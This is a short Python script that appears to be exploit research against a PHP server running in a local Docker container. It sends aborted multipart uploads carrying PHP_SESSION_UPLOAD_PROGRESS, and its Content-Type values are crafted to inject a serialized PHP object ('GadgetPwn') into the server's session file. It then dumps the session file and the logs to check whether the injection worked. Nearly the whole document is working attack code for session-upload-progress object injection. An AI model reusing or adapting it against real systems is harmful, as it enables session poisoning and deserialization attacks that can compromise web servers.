#!/usr/bin/env python3
"""up4: isolate why up3's record vanished — control matrix.
3 uploads vs php_up, identical abort flow, varying ONLY the part Content-Type:
  1. clean    : application/octet-stream            (up2 control)
  2. pipe     : x|marker|                           (does '|' kill it?)
  3. payload  : x|O:9:"GadgetPwn":0:{}|             (up3 repeat)
Dump sess file after each + Apache error log tail.
"""
import socket, subprocess, urllib.request, uuid, time

HOST, PORT = "127.0.0.1", 8086

def attempt(tag, ct):
    SID = uuid.uuid4().hex
    P = "p_" + tag
    body_head = (
        "------up4\r\n"
        "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        + P + "\r\n"
        "------up4\r\n"
        "Content-Disposition: form-data; name=\"f\"; filename=\"ok.txt\"\r\n"
        "Content-Type: " + ct + "\r\n\r\n"
    ).encode("latin1")
    body_tail = b"\r\n------up4--\r\n"
    TOTAL = 4_000_000
    req = (
        "POST /target.php HTTP/1.1\r\n"
        "Host: 127.0.0.1:8086\r\n"
        "Cookie: PHPSESSID=" + SID + "\r\n"
        "Content-Type: multipart/form-data; boundary=----up4\r\n"
        "Content-Length: " + str(len(body_head) + TOTAL + len(body_tail)) + "\r\n"
        "\r\n"
    ).encode()
    s = socket.create_connection((HOST, PORT), timeout=30)
    s.sendall(req + body_head)
    sent = 0
    pad = b"P" * 65536
    while sent < TOTAL // 2:
        n = min(len(pad), TOTAL // 2 - sent)
        s.sendall(pad[:n]); sent += n
    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
    s.close()
    time.sleep(1.2)
    r = subprocess.run(["docker", "exec", "php_up", "sh", "-c",
                        "wc -c < /tmp/sess_" + SID + " 2>/dev/null || echo MISSING"],
                       capture_output=True, timeout=20)
    size = r.stdout.decode().strip()
    raw = b""
    if size != "MISSING" and size != "0":
        raw = subprocess.run(["docker", "exec", "php_up", "cat", "/tmp/sess_" + SID],
                             capture_output=True, timeout=20).stdout
    print("[%s] ct=%r sess=%s bytes" % (tag, ct, size), flush=True)
    if raw:
        print("    latin1:", raw.decode("latin1", "replace")[:300], flush=True)
    return SID, size

attempt("clean", "application/octet-stream")
attempt("pipe", "x|marker|")
attempt("payload", 'x|O:9:"GadgetPwn":0:{}|')

r = subprocess.run(["docker", "logs", "--tail", "15", "php_up"],
                   capture_output=True, timeout=20)
print("--- php_up logs ---", flush=True)
print((r.stdout + r.stderr).decode("latin1", "replace"), flush=True)
